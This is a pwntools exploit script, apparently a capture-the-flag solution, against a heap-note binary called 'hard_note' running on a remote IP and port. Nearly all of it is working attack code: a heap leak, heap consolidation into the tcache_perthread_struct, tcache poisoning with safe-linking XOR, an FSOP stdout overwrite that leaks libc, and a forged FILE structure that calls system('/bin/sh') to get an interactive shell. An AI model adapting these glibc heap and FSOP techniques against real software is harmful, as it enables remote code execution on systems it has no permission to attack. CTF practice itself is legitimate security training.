#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
    local = 0
    debug = 0
    
    for arg in sys.argv[1:]:
        if arg in ('-h', '--help'):
            print('Usage: python ' + sys.argv[0] + ' <option> ...')
            print('Option:')
            print('        -h, --help:     Show help')
            print('        -l, --local:    Running on local')
            print('        -d, --debug:    Use gdb auto attach')
            exit(0)
        if arg in ('-l', '--local'):
            local = 1
        if arg in ('-d', '--debug'):
            debug = 1
        
    if local:
        s = process('./hard_note')
        if debug:
            gdb.attach(s, gdbscript='''   

            ''')
        else:
            raw_input('DEBUG')
    else:
        s = remote('45.122.249.68', 10009)
        
    return s
    
s = conn()

elf = ELF('hard_note')
libc = ELF('libc.so.6')

def create(index, size, data):
    s.sendlineafter(b'> ', b'1')
    s.sendlineafter(b'Index: ', index)
    s.sendlineafter(b'Size: ', bytes(str(size), 'utf-8'))
    s.sendafter(b'Data: ', data)

def delete(index):
    s.sendlineafter(b'> ', b'2')
    s.sendlineafter(b'What index you want to delete: ', index)

def xor(pointer, heap):
    return p64(pointer ^ (heap >> 12))

# Get heap leak
s.recvuntil(b'I have a gift for you: ')
heap_base = int(s.recvline()[:-1].decode(), 16) - 0x2a0
log.info('Heap base: 0x%x', heap_base)

# Heap consolidate to malloc to tcache_pthread_structer
create(b'0', 0x30, p64(0) + p64(0x2c1) + p64(heap_base + 0x2c0) * 2)
create(b'0', 0x288, b'A')
create(b'1', 0x4f0, b'A')
create(b'2', 0x288, b'A')
create(b'3', 0x20, b'A')
delete(b'2')
delete(b'0')
create(b'0', 0x288, b'A' * 0x280 + p64(0x2c0))
delete(b'0')
delete(b'1')
create(b'0', 0x220, b'A' * 0x30 + xor(heap_base + 0x10, heap_base + 0x300) + p64(0))
create(b'0', 0x288, b'A')
create(b'0', 0x580, b'A')

# Tcache pthread attack to write libc address to [0x300] tcache list pointer
create(b'0', 0x280, p64(0) * 2 + p64(0x10000) + p64(0) * 22 + p64(heap_base + 0x200) + p64(0) * 35 + p64(0xa1))
delete(b'0')

for i in range(7):
    create(bytes(str(i), 'utf-8'), 0x90, b'B')

for i in range(7):
    delete(bytes(str(i), 'utf-8'))

create(b'0', 0xa0, b'B')
delete(b'0')

# FSOP to leak libc address
create(b'0', 0x280, p64(0) * 2 + p64(7) + p64(0) * 8 + p64(0x100000000) + p64(0) * 12 + p64(heap_base + 0xa110) + p64(0) * 37 + b'\x60\x27')
create(b'1', 0x2ef, p64(0xfbad1800) + p64(0) * 3 + b'\x00')

libc.address = int.from_bytes(s.recv(14)[-6:], byteorder = 'little', signed = False) - 0x21b720

lock = libc.address + 0x21b730
wide_data = libc.address + 0x218980
_IO_helper_jumps = libc.address + 0x219960
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']
_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']

log.info('Libc base: 0x%x', libc.address)
log.info('Eviron: 0x%x', libc.symbols['environ'])
log.info('_IO_2_1_stdout_: 0x%x', libc.symbols['_IO_2_1_stdout_'])

# FSOP get shell
delete(b'0')
create(b'0', 0x280, p64(0) * 9 + p64(1) + p64(0) * 42 + p64(libc.symbols['_IO_2_1_stdout_']))

fake_stdout = b'/bin/sh\x00'
fake_stdout += p64(_IO_2_1_stdout_ + 131) * 7
fake_stdout += p64(_IO_2_1_stdout_ + 132)
fake_stdout += p64(0)*4
fake_stdout += p64(_IO_2_1_stdin_)
fake_stdout += p64(1)
fake_stdout += p64(-1, signed = True)
fake_stdout += p64(0x000000000a000000)
fake_stdout += p64(lock)
fake_stdout += p64(-1, signed = True)
fake_stdout += p64(0)
fake_stdout += p64(wide_data)
fake_stdout += p64(0)*3
fake_stdout += p64(0x00000000ffffffff)
fake_stdout += p64(0)*2
fake_stdout += p64(_IO_helper_jumps)
fake_stdout += p64(0)*39
fake_stdout += p64(system)

create(b'1', 0x250, fake_stdout)

s.interactive()
